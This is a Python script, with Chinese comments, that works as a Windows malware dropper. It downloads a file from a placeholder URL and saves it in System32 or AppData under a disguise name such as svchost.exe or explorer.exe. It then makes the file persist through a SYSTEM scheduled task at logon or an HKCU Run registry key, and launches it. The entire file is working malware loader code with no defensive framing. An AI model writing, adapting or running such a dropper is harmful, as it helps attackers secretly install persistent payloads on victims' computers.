import os
import random
import ctypes
import requests
import platform
import winreg
import subprocess
#设置下载连接
DOWNLOAD_URL = "https://xxxxx/main.zip"
FAKE_NAMES = ["svchost.exe", "system.exe", "explorer.exe", "notepad.exe", "server.exe"]


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def get_download_path():
    if os.name == 'nt':
        system_root = os.environ.get('SystemRoot')
        if system_root:
            paths = [
                os.path.join(system_root, 'System32'),
                os.path.join(system_root, 'SysWOW64'),
                os.path.join(os.path.expanduser("~"), 'AppData', 'Roaming'),
                os.path.expanduser("~")
            ]
        else:
            paths = [
                os.path.join(os.path.expanduser("~"), 'AppData', 'Roaming'),
                os.path.expanduser("~")
            ]
    else:
        paths = [os.path.expanduser("~")]
    return paths


def choose_filename(paths):
    while True:
        fake_name = random.choice(FAKE_NAMES)
        for path in paths:
            file_path = os.path.join(path, fake_name)
            if not os.path.exists(file_path):
                return file_path


def download_file(url, file_path):
    try:
        response = requests.get(url, stream=True)
        response.raise_for_status()
        with open(file_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        return True
    except requests.exceptions.RequestException as e:
        print(f"下载失败: {e}")
        return False
    except Exception as e:
        print("其他下载错误：", e)
        return False


def create_startup_task(file_path, task_name, admin=False):
    if platform.system() != "Windows":
        print("自启动任务创建仅支持Windows系统。")
        return

    if admin:
        command = [
            "schtasks",
            "/Create",
            "/SC", "ONLOGON",
            "/TN", task_name,
            "/TR", f'"{file_path}"',
            "/RU", "SYSTEM",
            "/F"
        ]

        try:
            subprocess.run(command, check=True, shell=True, capture_output=True)
            print(f"已创建管理员权限的计划任务: {task_name}")
        except subprocess.CalledProcessError as e:
            print(f"创建计划任务失败: {e.stderr.decode()}")

    else:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE) as key:
                winreg.SetValueEx(key, task_name, 0, winreg.REG_SZ, file_path)
                print(f"已创建用户级自启动项: {task_name}")
        except Exception as e:
            print(f"创建自启动项失败: {e}")


def main():
    paths = get_download_path()
    file_path = choose_filename(paths)
    if download_file(DOWNLOAD_URL, file_path + ".zip"):
        print(f"文件已下载至: {file_path}.zip")

        try:
            os.rename(file_path + ".zip", file_path)
            print(f"文件已重命名为: {file_path}")
        except OSError as e:
            print(f"重命名文件失败：{e}")
            return

        if is_admin():
            create_startup_task(file_path, os.path.basename(file_path)[:-4], admin=True)
            try:
                os.startfile(file_path)
            except:
                pass
        else:
            create_startup_task(file_path, os.path.basename(file_path)[:-4], admin=False)
            try:
                os.startfile(file_path)
            except:
                pass


if __name__ == "__main__":
    main()